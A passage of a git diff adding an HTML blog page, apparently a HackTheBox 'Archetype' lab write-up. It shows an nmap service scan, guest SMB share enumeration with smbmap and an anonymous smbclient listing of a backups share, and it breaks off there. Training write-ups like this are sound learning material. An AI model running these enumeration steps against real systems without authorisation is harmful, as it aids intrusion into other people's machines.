@@ -1,0 +1,1105 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/archetype-htb/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=archetype-htb/livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HackTheBox Archetype Writeup &middot; </title>
+    <meta name="title" content="HackTheBox Archetype Writeup &middot; ">
+  
+
+  
+  
+  
+  
+  
+    
+  
+    
+  
+    
+  
+  
+  
+    <meta name="keywords" content="Archetype | Windows,Reconnaissance,Initial Access,Lateral Movement,Post Exploitation,Local Enumeration,Privilege Escalation,Conclusion,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/archetype-htb/posts/8-spmachine/">
+  
+  
+  
+
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/archetype-htb/posts/8-spmachine/">
+	<meta property="og:title" content="HackTheBox Archetype Writeup">
+	<meta property="og:description" content="Archetype | Windows # This documentation attempts to explain the path to full system compromise on the ‘Archetype’ machine, from an exposed SMB share through a misconfigured MS SQL server to administrator privileges. Tools and techniques employed are detailed throughout.
+Reconnaissance # The very initial step is getting a network perspective of the machine using nmap.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-09-13T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-09-13T00:00:00+00:00">
+		<meta property="article:tag" content="Archetype | Windows">
+		<meta property="article:tag" content="Reconnaissance">
+		<meta property="article:tag" content="Initial Access">
+		<meta property="article:tag" content="Lateral Movement">
+		<meta property="article:tag" content="Post Exploitation">
+		<meta property="article:tag" content="Local Enumeration">
+
+  
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="HackTheBox Archetype Writeup">
+	<meta name="twitter:description" content="Archetype | Windows # This documentation attempts to explain the path to full system compromise on the ‘Archetype’ machine, from an exposed SMB share through a misconfigured MS SQL server to administrator privileges. Tools and techniques employed are detailed throughout.
+Reconnaissance # The very initial step is getting a network perspective of the machine using nmap.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/archetype-htb/css/main.bundle.min.a5fcdf584c4759811a4d4ef88924e302462c5503b36307d6c966ddfaa33a8739f0ddd4098cf3587588c79203d85ed37aa85919cfb208962c301c2113f6c4629b.css"
+    integrity="sha512-pfzfWExHWYEaTU74iSTjAkYsVQOzYwfWyWbd&#43;qM6hznw3dQJjPNYdYjHkgPYXtN6qFkZz7IIliwwHCET9sRimw==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/archetype-htb/js/appearance.min.764f412f07ea715415e9123a5eb5f355429502d0b760146b9bcab854bc50829dee14488594acd935dfcdc6a0fe7e6d14d7bee914ebb9272b251aa238cb52c4dd.js"
+    integrity="sha512-dk9BLwfqcVQV6RI6XrXzVUKVAtC3YBRrm8q4VLxQgp3uFEiFlKzZNd/NxqD&#43;fm0U177pFOu5JyslGqI4y1LE3Q=="></script>
+  
+
+
+  
+  
+  
+  
+  
+  
+    
+    <script defer src="/archetype-htb/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+    
+    <script defer src="/archetype-htb/js/medium-zoom.67b71ecf7eecce38673a92244d1ffd93edb5f1aeedd12e725d0f67fe901828fa3562f6a6d64ad290b36b7d7034b8ea16e63486d75d957bcf6a2732923e5d46e6.js" integrity="sha512-Z7cez37szjhnOpIkTR/9k&#43;218a7t0S5yXQ9n/pAYKPo1Yvam1krSkLNrfXA0uOoW5jSG112Ve89qJzKSPl1G5g=="></script>
+  
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/archetype-htb/js/main.bundle.min.be4a11c293f9b8ab20ab872f73c6b0c584fcba4a0df2c8ef7f414a5805c0ddab955ac23bec4a6d92a06087498d445cb2bf26a6602a27981980efe2bda70104a4.js"
+      integrity="sha512-vkoRwpP5uKsgq4cvc8awxYT8ukoN8sjvf0FKWAXA3auVWsI77EptkqBgh0mNRFyyvyamYConmBmA7&#43;K9pwEEpA=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/archetype-htb/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/archetype-htb/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/archetype-htb/favicon-16x16.png">
+    <link rel="manifest" href="/archetype-htb/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "HackTheBox Archetype Writeup",
+    "headline": "HackTheBox Archetype Writeup",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/archetype-htb/posts/8-spmachine/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-09-13T00:00:00\u002b00:00",
+    "datePublished": "2026-09-13T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-09-13T00:00:00\u002b00:00",
+    
+    "keywords": ["Archetype | Windows","Reconnaissance","Initial Access","Lateral Movement","Post Exploitation","Local Enumeration","Privilege Escalation","Conclusion"],
+    
+    "mainEntityOfPage": "http://localhost:1313/archetype-htb/posts/8-spmachine/",
+    "wordCount":  1555 
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    <header>
+      
+      
+        <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/archetype-htb/" class="text-base font-medium truncate min-w-0 shrink">
+      
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav aria-label="Main menu" class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/archetype-htb/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Home"
+      title="mor4ra">
+      
+      
+        <span class="text-sm font-medium break-normal">
+          Home
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Switch to dark appearance"
+        type="button"
+        class="text-sm bf-icon-color-hover"
+        title="Switch to dark appearance">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search (/ or ⌘K)"
+      class="flex items-center gap-2 rounded-lg border bf-border-color bf-border-color-hover bg-neutral-100/50 px-2 py-1 text-sm text-neutral-500 transition-colors hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral-400 dark:hover:text-primary-400"
+      title="Search (/ or ⌘K)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      <kbd
+        id="search-shortcut-hint"
+        class="pointer-events-none font-sans text-xs text-neutral-500 dark:text-neutral-400"
+        aria-hidden="true">
+        ⌘K
+      </kbd>
+    </button>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      
+<div class="mobile-header-row relative flex items-center h-14 gap-4">
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Switch to dark appearance"
+      title="Switch to dark appearance"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search (/ or ⌘K)"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/ or ⌘K)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label
+      for="mobile-menu-toggle"
+      tabindex="0"
+      role="button"
+      aria-expanded="false"
+      aria-controls="mobile-menu-dialog"
+      aria-label="Main menu"
+      class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      id="mobile-menu-dialog"
+      role="dialog"
+      aria-modal="true"
+      aria-label="Main menu"
+      style="scrollbar-gutter: stable;"
+      class="z-50 invisible overflow-y-auto opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100
+      
+        fixed inset-0 px-6 py-20 bg-neutral-50/97 dark:bg-neutral-900/99
+      
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        tabindex="0"
+        role="button"
+        aria-expanded="false"
+        aria-controls="mobile-menu-dialog"
+        class="fixed end-8 top-5 z-50 h-12 w-12 rounded-full flex items-center justify-center cursor-pointer select-none bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="sr-only">Close menu</span>
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav
+        aria-label="Mobile menu"
+        class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <div class="flex items-center gap-4">
+        <a
+          href="/archetype-htb/"
+          aria-label="Home"
+          
+          class="flex grow items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+          
+          <span title="mor4ra" class="text-2xl font-bold tracking-tight">
+            Home
+          </span>
+        </a>
+        
+      </div>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+      
+    </header>
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  
+  
+  
+  <article>
+    
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox Archetype Writeup
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-09-13T00:00:00&#43;00:00">September 13, 2026</time><span class="px-2 text-primary-500">&middot;</span><span>1555 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+      
+      
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+    
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h1 class="relative group">Archetype | Windows
+    <div id="archetype--windows" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#archetype--windows" aria-label="Anchor">#</a>
+    </span>
+    
+</h1>
+<p>This documentation attempts to explain the path to full system compromise on the &lsquo;Archetype&rsquo; machine, from an exposed SMB share through a misconfigured MS SQL server to administrator privileges. Tools and techniques employed are detailed throughout.</p>
+
+<h2 class="relative group"><em>Reconnaissance</em>
+    <div id="reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>The very initial step is getting a network perspective of the machine using <code>nmap</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sV -sC &lt;target-IP&gt;                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-03 00:40 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.187
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">995</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> microsoft-ds
+</span></span><span style="display:flex;"><span>1433/tcp open  ms-sql-s     Microsoft SQL Server <span style="color:#ae81ff">2017</span> 14.00.1000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   &lt;target-IP&gt;:1433: 
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2017</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 14.00.1000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-09-03T04:28:57
+</span></span><span style="display:flex;"><span>|_Not valid after:  2056-09-03T04:28:57
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-09-03T04:48:11+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   &lt;target-IP&gt;:1433: 
+</span></span><span style="display:flex;"><span>|     Target_Name: ARCHETYPE
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: ARCHETYPE
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: ARCHETYPE
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: Archetype
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: Archetype
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2019</span> Standard 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: Archetype
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: ARCHETYPE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2026-09-02T21:48:02-07:00
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-09-03T04:48:01
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 462.30 seconds</span></span></code></pre></div></div>
+<p><em>The scan results show that the mssql(port 1433) and smb services(ports 139 &amp; 445) are running on the target. (alongside other ports)</em>
+<em>Other &lsquo;juicy&rsquo; details include, the OS(a Windows Server 2019 machine), anonymous SMB access is available, there&rsquo;s an unpatched mssql server(post-sp updates not applied) and the port for winRM is open</em></p>
+
+<h2 class="relative group"><em>Initial Access</em>
+    <div id="initial-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#initial-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Began by enumerating the smb port to gather details about the service. <code>smbmap</code> is best for a quick overview, listing shares and viewing permissions.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -H 10.129.95.187 -u <span style="color:#e6db74">&#34;guest&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: &lt;target-IP&gt;:445       Name: &lt;target-IP&gt;             Status: Authenticated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Disk                                            Permissions     Comment
+</span></span><span style="display:flex;"><span>----                                            -----------     -------
+</span></span><span style="display:flex;"><span>ADMIN$                                          NO ACCESS       Remote Admin
+</span></span><span style="display:flex;"><span>backups                                         READ ONLY
+</span></span><span style="display:flex;"><span>C$                                              NO ACCESS       Default share
+</span></span><span style="display:flex;"><span>IPC$                                            READ ONLY       Remote IPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections </span></span></code></pre></div></div>
+<p>Knowing which shares were readable, I used <code>smbclient</code> to connect to the share and look at its contents.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //&lt;target-IP&gt;/backups -N
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 07:20:57 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 07:20:57 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  prod.dtsConfig                     AR      <span style="color:#ae81ff">609</span>  Mon Jan <span style="color:#ae81ff">20</span> 07:23:02 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
